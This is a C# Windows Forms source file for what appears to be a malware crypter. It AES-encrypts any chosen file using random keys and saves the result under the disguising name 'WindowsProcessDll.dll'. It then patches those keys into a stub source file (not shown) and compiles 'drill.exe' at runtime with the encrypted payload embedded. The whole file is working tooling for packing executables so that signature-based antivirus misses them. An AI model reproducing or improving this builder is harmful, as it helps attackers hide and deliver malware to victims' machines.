using Microsoft.CSharp;
using System;
using System.CodeDom.Compiler;
using System.Data;
using System.IO;
using System.Linq;
using System.Security.Cryptography;
using System.Text;
using System.Windows.Forms;

namespace MARI_HKA__
{
    public partial class Form1 : Form
    {
        public Form1()
        {
            InitializeComponent();
        }

        private void Form1_Load(object sender, EventArgs e)
        {
        }

        private void button1_Click_1(object sender, EventArgs e)
        {
            OpenFileDialog ob = new OpenFileDialog();
            ob.Multiselect = false;
            if (ob.ShowDialog() == DialogResult.OK)
            {
                txFile.Text = ob.FileName;
                Console.Write(txFile.Text);
            }
        }

        [Obsolete]
        private void button2_Click_1(object sender, EventArgs e)
        {
            Random rnd = new Random();

            string passPhrase = Drill.RandomCharsGenerate(32);
            string saltValue = Drill.RandomCharsGenerate(8);
            string hashAlgorithm = "SHA256";
            int passwordIterations = rnd.Next(3, 7);
            string initVector = Drill.RandomCharsGenerate(16);
            int keySize = 256;

            if (!File.Exists(txFile.Text))
            {
                MessageBox.Show("File doesn't exist !");
                return;
            }

            try
            {
                byte[] BytesFile = File.ReadAllBytes(txFile.Text);

                byte[] encryptBytes = Drill.Encrypt
                (
                    BytesFile,
                    passPhrase,
                    saltValue,
                    hashAlgorithm,
                    passwordIterations,
                    initVector,
                    keySize
                );

                string codeCompile = File.ReadAllText("DrillStub.cs");
                File.WriteAllBytes("WindowsProcessDll.dll", encryptBytes);

                codeCompile = codeCompile.Replace("xxxxxxxxxx", passPhrase);
                codeCompile = codeCompile.Replace("yyyyyyyyyy", saltValue);
                string passwordIterationsString = Convert.ToString(passwordIterations);
                codeCompile = codeCompile.Replace("aaaaaaaaaa", passwordIterationsString);
                codeCompile = codeCompile.Replace("bbbbbbbbbb", initVector);

                CSharpCodeProvider codeProvider = new CSharpCodeProvider();
                ICodeCompiler icc = codeProvider.CreateCompiler();
                string Output = "drill.exe";

                System.CodeDom.Compiler.CompilerParameters parameters = new CompilerParameters();
                parameters.ReferencedAssemblies.Add("System.dll");
                parameters.EmbeddedResources.Add(@"WindowsProcessDll.dll");
                parameters.GenerateExecutable = true;
                parameters.OutputAssembly = Output;
                CompilerResults results = icc.CompileAssemblyFromSource(parameters, codeCompile);

                MessageBox.Show("File ready !");
            }
            catch (Exception ex)
            {
                MessageBox.Show("ex");
                return;
            }
        }
    }

    public class Drill
    {
        public static byte[] Encrypt
    (
        byte[] plainTextBytes,
        string passPhrase,
        string saltValue,
        string hashAlgorithm,
        int passwordIterations,
        string initVector,
        int keySize
    )
        {
            byte[] initVectorBytes = Encoding.ASCII.GetBytes(initVector);
            byte[] saltValueBytes = Encoding.ASCII.GetBytes(saltValue);

            PasswordDeriveBytes password = new PasswordDeriveBytes
            (
                passPhrase,
                saltValueBytes,
                hashAlgorithm,
                passwordIterations
            );

            byte[] keyBytes = password.GetBytes(keySize / 8);

            var symmetricKey = Aes.Create("AesManaged");
            symmetricKey.Mode = CipherMode.CBC;

            ICryptoTransform encryptor = symmetricKey.CreateEncryptor
            (
                keyBytes,
                initVectorBytes
            );

            MemoryStream memoryStream = new MemoryStream();

            CryptoStream cryptoStream = new CryptoStream
            (
                memoryStream,
                encryptor,
                CryptoStreamMode.Write
            );

            cryptoStream.Write(plainTextBytes, 0, plainTextBytes.Length);

            cryptoStream.FlushFinalBlock();

            byte[] cipherTextBytes = memoryStream.ToArray();

            memoryStream.Close();
            cryptoStream.Close();


            return cipherTextBytes;
        }

        public static byte[] Decrypt
        (
            byte[] cipherTextBytes,
            string passPhrase,
            string saltValue,
            string hashAlgorithm,
            int passwordIterations,
            string initVector,
            int keySize
        )
        {
            byte[] initVectorBytes = Encoding.ASCII.GetBytes(initVector);
            byte[] saltValueBytes = Encoding.ASCII.GetBytes(saltValue);

            PasswordDeriveBytes password = new PasswordDeriveBytes
            (
                passPhrase,
                saltValueBytes,
                hashAlgorithm,
                passwordIterations
            );

            byte[] keyBytes = password.GetBytes(keySize / 8);

            var symmetricKey = Aes.Create("AesManaged");
            symmetricKey.Mode = CipherMode.CBC;

            ICryptoTransform decryptor = symmetricKey.CreateDecryptor
            (
                keyBytes,
                initVectorBytes
            );

            MemoryStream memoryStream = new MemoryStream(cipherTextBytes);

            CryptoStream cryptoStream = new CryptoStream
            (
                memoryStream,
                decryptor,
                CryptoStreamMode.Read
            );
            byte[] plainTextBytes = new byte[cipherTextBytes.Length];

            int decryptedByteCount = cryptoStream.Read
            (
                plainTextBytes,
                0,
                plainTextBytes.Length
            );

            memoryStream.Close();
            cryptoStream.Close();

            return plainTextBytes;
        }

        public static string RandomCharsGenerate(int lenght)
        {
            var random = new Random();
            var result = string.Join("", Enumerable.Range(0, lenght).Select(i => i % 2 == 0 ? (char)('A' + random.Next(26)) + "" : random.Next(1, 10) + ""));
            return result;
        }
    }
}
